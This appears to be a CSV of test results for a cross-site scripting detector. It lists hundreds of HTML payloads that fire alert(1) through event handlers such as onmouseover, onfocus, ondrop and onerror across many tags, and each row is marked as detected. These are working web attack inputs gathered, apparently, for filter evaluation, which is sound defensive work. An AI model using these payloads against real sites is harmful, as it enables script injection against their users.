Payload,Alert,Detected
"<div draggable=""true"" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable style=display:block>drop here</tr>",False,1
"<div draggable=""true"" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable style=display:block>drop here</tr>",False,1
"<div draggable=""true"" contenteditable>drag me</div><track ondragover=alert(1) contenteditable style=display:block>drop here</track>",False,1
"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable style=display:block>drop here</track>",False,1
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable style=display:block>drop here</tt>",False,1
"<div draggable=""true"" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable style=display:block>drop here</tt>",False,1
"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable style=display:block>drop here</u>",False,1
"<div draggable=""true"" contenteditable>drag me</div><u ondrop=alert(1) contenteditable style=display:block>drop here</u>",False,1
"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable style=display:block>drop here</ul>",False,1
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable style=display:block>drop here</ul>",False,1
"<div draggable=""true"" contenteditable>drag me</div><var ondragover=alert(1) contenteditable style=display:block>drop here</var>",False,1
"<div draggable=""true"" contenteditable>drag me</div><var ondrop=alert(1) contenteditable style=display:block>drop here</var>",False,1
"<div draggable=""true"" contenteditable>drag me</div><video ondragover=alert(1) contenteditable style=display:block>drop here</video>",False,1
"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable style=display:block>drop here</video>",False,1
"<div draggable=""true"" contenteditable>drag me</div><video2 ondragover=alert(1) contenteditable style=display:block>drop here</video2>",False,1
"<div draggable=""true"" contenteditable>drag me</div><video2 ondrop=alert(1) contenteditable style=display:block>drop here</video2>",False,1
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable style=display:block>drop here</wbr>",False,1
"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable style=display:block>drop here</wbr>",False,1
"<div draggable=""true"" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable style=display:block>drop here</xmp>",False,1
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable style=display:block>drop here</xmp>",False,1
"<div draggable=""true"" ondrag=""alert(1)"" style=display:block>test</div>",False,1
"<div draggable=""true"" ondragend=""alert(1)"" style=display:block>test</div>",False,1
"<div draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</div>",False,1
"<div draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</div>",False,1
"<div draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</div>",False,1
"<div draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</div>",False,1
"<div id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></div>",False,1
<div id=x tabindex=1 onfocus=alert(1)></div>,False,1
<div id=x tabindex=1 onfocusin=alert(1)></div>,False,1
<div onafterscriptexecute=alert(1)><script>1</script>,False,1
"<div onbeforecopy=""alert(1)"" contenteditable>test</div>",False,1
"<div onbeforecut=""alert(1)"" contenteditable>test</div>",False,1
<div onbeforescriptexecute=alert(1)><script>1</script>,False,1
<div onblur=alert(1) id=x tabindex=1 style=display:block>test</div><input value=clickme>,False,1
"<div onclick=""alert(1)"" style=display:block>test</div>",False,1
<div oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<div oncontextmenu=""alert(1)"" style=display:block>test</div>",False,1
"<div oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<div oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<div ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</div>",False,1
<div onfocus=alert(1) autofocus tabindex=1>,False,1
<div onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</div><input value=clickme>,False,1
"<div onkeydown=""alert(1)"" contenteditable style=display:block>test</div>",False,1
"<div onkeypress=""alert(1)"" contenteditable style=display:block>test</div>",False,1
"<div onkeyup=""alert(1)"" contenteditable style=display:block>test</div>",False,1
"<div onmousedown=""alert(1)"" style=display:block>test</div>",False,1
"<div onmouseenter=""alert(1)"" style=display:block>test</div>",False,1
"<div onmouseleave=""alert(1)"" style=display:block>test</div>",False,1
"<div onmousemove=""alert(1)"" style=display:block>test</div>",False,1
"<div onmouseout=""alert(1)"" style=display:block>test</div>",False,1
"<div onmouseover=""alert(1)"" style=display:block>test</div>",False,1
"<div onmouseup=""alert(1)"" style=display:block>test</div>",False,1
<div onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<div onpaste=""alert(1)"" contenteditable>test</div>",False,1
<div onpointercancel=alert(1)>XSS</div>,False,1
<div onpointerdown=alert(1) style=display:block>XSS</div>,False,1
<div onpointerenter=alert(1) style=display:block>XSS</div>,False,1
<div onpointerleave=alert(1) style=display:block>XSS</div>,False,1
<div onpointermove=alert(1) style=display:block>XSS</div>,False,1
<div onpointerout=alert(1) style=display:block>XSS</div>,False,1
<div onpointerover=alert(1) style=display:block>XSS</div>,False,1
<div onpointerrawupdate=alert(1) style=display:block>XSS</div>,False,1
<div onpointerup=alert(1) style=display:block>XSS</div>,False,1
"<div onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></div>",False,1
<div onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></div>,False,1
<div onwebkitmouseforcechanged=alert(1)>XSS</div>,False,1
<div onwebkitmouseforcedown=alert(1)>XSS</div>,False,1
<div onwebkitmouseforceup=alert(1)>XSS</div>,False,1
<div onwebkitmouseforcewillbegin=alert(1)>XSS</div>,False,1
<div onwebkitwillrevealbottom=alert(1)>XSS</div>,False,1
<dl contenteditable onbeforeinput=alert(1)>test,False,1
"<dl draggable=""true"" ondrag=""alert(1)"" style=display:block>test</dl>",False,1
"<dl draggable=""true"" ondragend=""alert(1)"" style=display:block>test</dl>",False,1
"<dl draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</dl>",False,1
"<dl draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</dl>",False,1
"<dl draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</dl>",False,1
"<dl draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</dl>",False,1
"<dl id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></dl>",False,1
<dl id=x tabindex=1 onfocus=alert(1)></dl>,False,1
<dl id=x tabindex=1 onfocusin=alert(1)></dl>,False,1
<dl onafterscriptexecute=alert(1)><script>1</script>,False,1
"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>",False,1
"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",False,1
<dl onbeforescriptexecute=alert(1)><script>1</script>,False,1
<dl onblur=alert(1) id=x tabindex=1 style=display:block>test</dl><input value=clickme>,False,1
"<dl onclick=""alert(1)"" style=display:block>test</dl>",False,1
<dl oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<dl oncontextmenu=""alert(1)"" style=display:block>test</dl>",False,1
"<dl oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<dl oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<dl ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</dl>",False,1
<dl onfocus=alert(1) autofocus tabindex=1>,False,1
<dl onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dl><input value=clickme>,False,1
"<dl onkeydown=""alert(1)"" contenteditable style=display:block>test</dl>",False,1
"<dl onkeypress=""alert(1)"" contenteditable style=display:block>test</dl>",False,1
"<dl onkeyup=""alert(1)"" contenteditable style=display:block>test</dl>",False,1
"<dl onmousedown=""alert(1)"" style=display:block>test</dl>",False,1
"<dl onmouseenter=""alert(1)"" style=display:block>test</dl>",False,1
"<dl onmouseleave=""alert(1)"" style=display:block>test</dl>",False,1
"<dl onmousemove=""alert(1)"" style=display:block>test</dl>",False,1
"<dl onmouseout=""alert(1)"" style=display:block>test</dl>",False,1
"<dl onmouseover=""alert(1)"" style=display:block>test</dl>",False,1
"<dl onmouseup=""alert(1)"" style=display:block>test</dl>",False,1
<dl onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<dl onpaste=""alert(1)"" contenteditable>test</dl>",False,1
<dl onpointercancel=alert(1)>XSS</dl>,False,1
<dl onpointerdown=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointerenter=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointerleave=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointermove=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointerout=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointerover=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointerrawupdate=alert(1) style=display:block>XSS</dl>,False,1
<dl onpointerup=alert(1) style=display:block>XSS</dl>,False,1
"<dl onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dl>",False,1
<dl onwebkitmouseforcechanged=alert(1)>XSS</dl>,False,1
<dl onwebkitmouseforcedown=alert(1)>XSS</dl>,False,1
<dl onwebkitmouseforceup=alert(1)>XSS</dl>,False,1
<dl onwebkitmouseforcewillbegin=alert(1)>XSS</dl>,False,1
<dl onwebkitwillrevealbottom=alert(1)>XSS</dl>,False,1
<dt contenteditable onbeforeinput=alert(1)>test,False,1
"<dt draggable=""true"" ondrag=""alert(1)"" style=display:block>test</dt>",False,1
"<dt draggable=""true"" ondragend=""alert(1)"" style=display:block>test</dt>",False,1
"<dt draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</dt>",False,1
"<dt draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</dt>",False,1
"<dt draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</dt>",False,1
"<dt draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</dt>",False,1
"<dt id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></dt>",False,1
<dt id=x tabindex=1 onfocus=alert(1)></dt>,False,1
<dt id=x tabindex=1 onfocusin=alert(1)></dt>,False,1
<dt onafterscriptexecute=alert(1)><script>1</script>,False,1
"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>",False,1
"<dt onbeforecut=""alert(1)"" contenteditable>test</dt>",False,1
<dt onbeforescriptexecute=alert(1)><script>1</script>,False,1
<dt onblur=alert(1) id=x tabindex=1 style=display:block>test</dt><input value=clickme>,False,1
"<dt onclick=""alert(1)"" style=display:block>test</dt>",False,1
<dt oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<dt oncontextmenu=""alert(1)"" style=display:block>test</dt>",False,1
"<dt oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<dt oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<dt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</dt>",False,1
<dt onfocus=alert(1) autofocus tabindex=1>,False,1
<dt onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dt><input value=clickme>,False,1
"<dt onkeydown=""alert(1)"" contenteditable style=display:block>test</dt>",False,1
"<dt onkeypress=""alert(1)"" contenteditable style=display:block>test</dt>",False,1
"<dt onkeyup=""alert(1)"" contenteditable style=display:block>test</dt>",False,1
"<dt onmousedown=""alert(1)"" style=display:block>test</dt>",False,1
"<dt onmouseenter=""alert(1)"" style=display:block>test</dt>",False,1
"<dt onmouseleave=""alert(1)"" style=display:block>test</dt>",False,1
"<dt onmousemove=""alert(1)"" style=display:block>test</dt>",False,1
"<dt onmouseout=""alert(1)"" style=display:block>test</dt>",False,1
"<dt onmouseover=""alert(1)"" style=display:block>test</dt>",False,1
"<dt onmouseup=""alert(1)"" style=display:block>test</dt>",False,1
<dt onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<dt onpaste=""alert(1)"" contenteditable>test</dt>",False,1
<dt onpointercancel=alert(1)>XSS</dt>,False,1
<dt onpointerdown=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointerenter=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointerleave=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointermove=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointerout=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointerover=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointerrawupdate=alert(1) style=display:block>XSS</dt>,False,1
<dt onpointerup=alert(1) style=display:block>XSS</dt>,False,1
"<dt onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dt>",False,1
<dt onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></dt>,False,1
<dt onwebkitmouseforcechanged=alert(1)>XSS</dt>,False,1
<dt onwebkitmouseforcedown=alert(1)>XSS</dt>,False,1
<dt onwebkitmouseforceup=alert(1)>XSS</dt>,False,1
<dt onwebkitmouseforcewillbegin=alert(1)>XSS</dt>,False,1
<dt onwebkitwillrevealbottom=alert(1)>XSS</dt>,False,1
<element contenteditable onbeforeinput=alert(1)>test,False,1
"<element draggable=""true"" ondrag=""alert(1)"" style=display:block>test</element>",False,1
"<element draggable=""true"" ondragend=""alert(1)"" style=display:block>test</element>",False,1
"<element draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</element>",False,1
"<element draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</element>",False,1
"<element draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</element>",False,1
"<element draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</element>",False,1
"<element id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></element>",False,1
<element id=x tabindex=1 onfocus=alert(1)></element>,False,1
<element id=x tabindex=1 onfocusin=alert(1)></element>,False,1
<element onafterscriptexecute=alert(1)><script>1</script>,False,1
"<element onbeforecopy=""alert(1)"" contenteditable>test</element>",False,1
"<element onbeforecut=""alert(1)"" contenteditable>test</element>",False,1
<element onbeforescriptexecute=alert(1)><script>1</script>,False,1
<element onblur=alert(1) id=x tabindex=1 style=display:block>test</element><input value=clickme>,False,1
"<element onclick=""alert(1)"" style=display:block>test</element>",False,1
<element oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<element oncontextmenu=""alert(1)"" style=display:block>test</element>",False,1
"<element oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<element oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<element ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</element>",False,1
<element onfocus=alert(1) autofocus tabindex=1>,False,1
<element onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</element><input value=clickme>,False,1
"<element onkeydown=""alert(1)"" contenteditable style=display:block>test</element>",False,1
"<element onkeypress=""alert(1)"" contenteditable style=display:block>test</element>",False,1
"<element onkeyup=""alert(1)"" contenteditable style=display:block>test</element>",False,1
"<element onmousedown=""alert(1)"" style=display:block>test</element>",False,1
"<element onmouseenter=""alert(1)"" style=display:block>test</element>",False,1
"<element onmouseleave=""alert(1)"" style=display:block>test</element>",False,1
"<element onmousemove=""alert(1)"" style=display:block>test</element>",False,1
"<element onmouseout=""alert(1)"" style=display:block>test</element>",False,1
"<element onmouseover=""alert(1)"" style=display:block>test</element>",False,1
"<element onmouseup=""alert(1)"" style=display:block>test</element>",False,1
<element onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<element onpaste=""alert(1)"" contenteditable>test</element>",False,1
<element onpointercancel=alert(1)>XSS</element>,False,1
<element onpointerdown=alert(1) style=display:block>XSS</element>,False,1
<element onpointerenter=alert(1) style=display:block>XSS</element>,False,1
<element onpointerleave=alert(1) style=display:block>XSS</element>,False,1
<element onpointermove=alert(1) style=display:block>XSS</element>,False,1
<element onpointerout=alert(1) style=display:block>XSS</element>,False,1
<element onpointerover=alert(1) style=display:block>XSS</element>,False,1
<element onpointerrawupdate=alert(1) style=display:block>XSS</element>,False,1
<element onpointerup=alert(1) style=display:block>XSS</element>,False,1
"<element onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></element>",False,1
<element onwebkitmouseforcechanged=alert(1)>XSS</element>,False,1
<element onwebkitmouseforcedown=alert(1)>XSS</element>,False,1
<element onwebkitmouseforceup=alert(1)>XSS</element>,False,1
<element onwebkitmouseforcewillbegin=alert(1)>XSS</element>,False,1
<element onwebkitwillrevealbottom=alert(1)>XSS</element>,False,1
<em contenteditable onbeforeinput=alert(1)>test,False,1
"<em draggable=""true"" ondrag=""alert(1)"" style=display:block>test</em>",False,1
"<em draggable=""true"" ondragend=""alert(1)"" style=display:block>test</em>",False,1
"<em draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</em>",False,1
"<em draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</em>",False,1
"<em draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</em>",False,1
"<em draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</em>",False,1
"<em id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></em>",False,1
<em id=x tabindex=1 onfocus=alert(1)></em>,False,1
<em id=x tabindex=1 onfocusin=alert(1)></em>,False,1
<em onafterscriptexecute=alert(1)><script>1</script>,False,1
"<em onbeforecopy=""alert(1)"" contenteditable>test</em>",False,1
"<em onbeforecut=""alert(1)"" contenteditable>test</em>",False,1
<em onbeforescriptexecute=alert(1)><script>1</script>,False,1
<em onblur=alert(1) id=x tabindex=1 style=display:block>test</em><input value=clickme>,False,1
"<em onclick=""alert(1)"" style=display:block>test</em>",False,1
<em oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<em oncontextmenu=""alert(1)"" style=display:block>test</em>",False,1
"<em oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<em oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<em ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</em>",False,1
<em onfocus=alert(1) autofocus tabindex=1>,False,1
<em onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</em><input value=clickme>,False,1
"<em onkeydown=""alert(1)"" contenteditable style=display:block>test</em>",False,1
"<em onkeypress=""alert(1)"" contenteditable style=display:block>test</em>",False,1
"<em onkeyup=""alert(1)"" contenteditable style=display:block>test</em>",False,1
"<em onmousedown=""alert(1)"" style=display:block>test</em>",False,1
"<em onmouseenter=""alert(1)"" style=display:block>test</em>",False,1
"<em onmouseleave=""alert(1)"" style=display:block>test</em>",False,1
"<em onmousemove=""alert(1)"" style=display:block>test</em>",False,1
"<em onmouseout=""alert(1)"" style=display:block>test</em>",False,1
"<em onmouseover=""alert(1)"" style=display:block>test</em>",False,1
"<em onmouseup=""alert(1)"" style=display:block>test</em>",False,1
<em onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<em onpaste=""alert(1)"" contenteditable>test</em>",False,1
<em onpointercancel=alert(1)>XSS</em>,False,1
<em onpointerdown=alert(1) style=display:block>XSS</em>,False,1
<em onpointerenter=alert(1) style=display:block>XSS</em>,False,1
<em onpointerleave=alert(1) style=display:block>XSS</em>,False,1
<em onpointermove=alert(1) style=display:block>XSS</em>,False,1
<em onpointerout=alert(1) style=display:block>XSS</em>,False,1
<em onpointerover=alert(1) style=display:block>XSS</em>,False,1
<em onpointerrawupdate=alert(1) style=display:block>XSS</em>,False,1
<em onpointerup=alert(1) style=display:block>XSS</em>,False,1
"<em onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></em>",False,1
<em onwebkitmouseforcechanged=alert(1)>XSS</em>,False,1
<em onwebkitmouseforcedown=alert(1)>XSS</em>,False,1
<em onwebkitmouseforceup=alert(1)>XSS</em>,False,1
<em onwebkitmouseforcewillbegin=alert(1)>XSS</em>,False,1
<em onwebkitwillrevealbottom=alert(1)>XSS</em>,False,1
<embed contenteditable onbeforeinput=alert(1)>test,False,1
"<embed draggable=""true"" ondrag=""alert(1)"" style=display:block>test</embed>",False,1
"<embed draggable=""true"" ondragend=""alert(1)"" style=display:block>test</embed>",False,1
"<embed draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</embed>",False,1
"<embed draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</embed>",False,1
"<embed draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</embed>",False,1
"<embed draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</embed>",False,1
<embed id=x onfocus=alert(1) type=text/html>,False,1
<embed id=x onfocusin=alert(1) type=text/html>,False,1
"<embed id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></embed>",False,1
<embed onafterscriptexecute=alert(1)><script>1</script>,False,1
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",False,1
"<embed onbeforecut=""alert(1)"" contenteditable>test</embed>",False,1
<embed onbeforescriptexecute=alert(1)><script>1</script>,False,1
<embed onblur=alert(1) id=x tabindex=1 style=display:block>test</embed><input value=clickme>,False,1
"<embed onclick=""alert(1)"" style=display:block>test</embed>",False,1
<embed oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<embed oncontextmenu=""alert(1)"" style=display:block>test</embed>",False,1
"<embed oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<embed oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<embed ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</embed>",False,1
<embed onfocus=alert(1) autofocus tabindex=1>,False,1
<embed onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</embed><input value=clickme>,False,1
"<embed onkeydown=""alert(1)"" contenteditable style=display:block>test</embed>",False,1
"<embed onkeypress=""alert(1)"" contenteditable style=display:block>test</embed>",False,1
"<embed onkeyup=""alert(1)"" contenteditable style=display:block>test</embed>",False,1
"<embed onmousedown=""alert(1)"" style=display:block>test</embed>",False,1
"<embed onmouseenter=""alert(1)"" style=display:block>test</embed>",False,1
"<embed onmouseleave=""alert(1)"" style=display:block>test</embed>",False,1
"<embed onmousemove=""alert(1)"" style=display:block>test</embed>",False,1
"<embed onmouseout=""alert(1)"" style=display:block>test</embed>",False,1
"<embed onmouseover=""alert(1)"" style=display:block>test</embed>",False,1
"<embed onmouseup=""alert(1)"" style=display:block>test</embed>",False,1
<embed onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<embed onpaste=""alert(1)"" contenteditable>test</embed>",False,1
<embed onpointercancel=alert(1)>XSS</embed>,False,1
<embed onpointerdown=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointerenter=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointerleave=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointermove=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointerout=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointerover=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointerrawupdate=alert(1) style=display:block>XSS</embed>,False,1
<embed onpointerup=alert(1) style=display:block>XSS</embed>,False,1
"<embed onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></embed>",False,1
<embed onwebkitmouseforcechanged=alert(1)>XSS</embed>,False,1
<embed onwebkitmouseforcedown=alert(1)>XSS</embed>,False,1
<embed onwebkitmouseforceup=alert(1)>XSS</embed>,False,1
<embed onwebkitmouseforcewillbegin=alert(1)>XSS</embed>,False,1
<embed onwebkitwillrevealbottom=alert(1)>XSS</embed>,False,1
<embed src=/ onload=alert(1)>,False,1
<embed src=1 onerror=alert(1) type=image/gif>,False,1
<fieldset contenteditable onbeforeinput=alert(1)>test,False,1
"<fieldset draggable=""true"" ondrag=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset draggable=""true"" ondragend=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></fieldset>",False,1
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>,False,1
<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>,False,1
<fieldset onafterscriptexecute=alert(1)><script>1</script>,False,1
"<fieldset onbeforecopy=""alert(1)"" contenteditable>test</fieldset>",False,1
"<fieldset onbeforecut=""alert(1)"" contenteditable>test</fieldset>",False,1
<fieldset onbeforescriptexecute=alert(1)><script>1</script>,False,1
<fieldset onblur=alert(1) id=x tabindex=1 style=display:block>test</fieldset><input value=clickme>,False,1
"<fieldset onclick=""alert(1)"" style=display:block>test</fieldset>",False,1
<fieldset oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<fieldset oncontextmenu=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<fieldset oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<fieldset ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</fieldset>",False,1
<fieldset onfocus=alert(1) autofocus tabindex=1>,False,1
<fieldset onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</fieldset><input value=clickme>,False,1
"<fieldset onkeydown=""alert(1)"" contenteditable style=display:block>test</fieldset>",False,1
"<fieldset onkeypress=""alert(1)"" contenteditable style=display:block>test</fieldset>",False,1
"<fieldset onkeyup=""alert(1)"" contenteditable style=display:block>test</fieldset>",False,1
"<fieldset onmousedown=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset onmouseenter=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset onmouseleave=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset onmousemove=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset onmouseout=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset onmouseover=""alert(1)"" style=display:block>test</fieldset>",False,1
"<fieldset onmouseup=""alert(1)"" style=display:block>test</fieldset>",False,1
<fieldset onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<fieldset onpaste=""alert(1)"" contenteditable>test</fieldset>",False,1
<fieldset onpointercancel=alert(1)>XSS</fieldset>,False,1
<fieldset onpointerdown=alert(1) style=display:block>XSS</fieldset>,False,1
